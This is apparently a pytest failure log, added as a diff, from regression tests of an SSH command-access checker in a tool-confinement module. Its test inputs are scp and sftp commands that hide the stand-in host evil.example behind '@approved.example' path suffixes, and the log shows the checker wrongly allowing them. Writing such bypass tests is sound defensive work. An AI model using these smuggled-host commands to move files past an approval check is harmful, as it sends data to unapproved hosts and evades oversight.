@@ -1,0 +1,64 @@
+FFFFFFFF...                                                              [100%]
+=================================== FAILURES ===================================
+_ test_remote_path_at_sign_cannot_change_approved_host[scp -F none evil.example:/tmp/file@approved.example ./copy] _
+/evidence/round28_regressions.py:15: in test_remote_path_at_sign_cannot_change_approved_host
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('scp -F none evil.example:/tmp/file@approved.example ./copy', 'review')
+_ test_remote_path_at_sign_cannot_change_approved_host[scp -F none ./copy user@evil.example:/tmp/file@approved.example] _
+/evidence/round28_regressions.py:15: in test_remote_path_at_sign_cannot_change_approved_host
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('scp -F none ./copy user@evil.example:/tmp/file@approved.example', 'review')
+_ test_remote_path_at_sign_cannot_change_approved_host[sftp -F none user@evil.example:/tmp/file@approved.example] _
+/evidence/round28_regressions.py:15: in test_remote_path_at_sign_cannot_change_approved_host
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp -F none user@evil.example:/tmp/file@approved.example', 'review')
+_ test_remote_path_at_sign_cannot_change_approved_host[scp -F none user@realm@evil.example:path@approved.example ./copy] _
+/evidence/round28_regressions.py:15: in test_remote_path_at_sign_cannot_change_approved_host
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('scp -F none user@realm@evil.example:path@approved.example ./copy', 'review')
+_ test_remote_path_at_sign_cannot_change_approved_host[sftp -F none evil.example:path@approved.example:extra] _
+/evidence/round28_regressions.py:15: in test_remote_path_at_sign_cannot_change_approved_host
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('sftp -F none evil.example:path@approved.example:extra', 'review')
+_ test_remote_path_at_sign_cannot_change_approved_host[scp -F none user@[2001:db8::1]:/tmp/file@approved.example ./copy] _
+/evidence/round28_regressions.py:17: in test_remote_path_at_sign_cannot_change_approved_host
+    assert extract_ssh_hosts_from_command(command)==({host},False)
+E   AssertionError: assert (set(), True) == ({'2001:db8::1'}, False)
+E     
+E     At index 0 diff: set() != {'2001:db8::1'}
+E     Use -v to get more diff
+_ test_local_paths_and_uris_keep_the_authority[scp -F none ./file@local user@approved.example:/tmp/file@tag] _
+/evidence/round28_regressions.py:29: in test_local_paths_and_uris_keep_the_authority
+    assert extract_ssh_hosts_from_command(command)==({'approved.example'},False)
+E   AssertionError: assert ({'local', 'tag'}, False) == ({'approved.example'}, False)
+E     
+E     At index 0 diff: {'local', 'tag'} != {'approved.example'}
+E     Use -v to get more diff
+_ test_local_paths_and_uris_keep_the_authority[scp -F none approved.example:/tmp/file ./copy@local] _
+/evidence/round28_regressions.py:29: in test_local_paths_and_uris_keep_the_authority
+    assert extract_ssh_hosts_from_command(command)==({'approved.example'},False)
+E   AssertionError: assert ({'approved.e...ocal'}, False) == ({'approved.example'}, False)
+E     
+E     At index 0 diff: {'local', 'approved.example'} != {'approved.example'}
+E     Use -v to get more diff
+=============================== warnings summary ===============================
+round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[scp -F none evil.example:/tmp/file@approved.example ./copy]
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[scp -F none evil.example:/tmp/file@approved.example ./copy]
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[scp -F none ./copy user@evil.example:/tmp/file@approved.example]
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[sftp -F none user@evil.example:/tmp/file@approved.example]
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[scp -F none user@realm@evil.example:path@approved.example ./copy]
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[sftp -F none evil.example:path@approved.example:extra]
+FAILED ../evidence/round28_regressions.py::test_remote_path_at_sign_cannot_change_approved_host[scp -F none user@[2001:db8::1]:/tmp/file@approved.example ./copy]
+FAILED ../evidence/round28_regressions.py::test_local_paths_and_uris_keep_the_authority[scp -F none ./file@local user@approved.example:/tmp/file@tag]
+FAILED ../evidence/round28_regressions.py::test_local_paths_and_uris_keep_the_authority[scp -F none approved.example:/tmp/file ./copy@local]
+8 failed, 3 passed, 1 warning in 0.14s
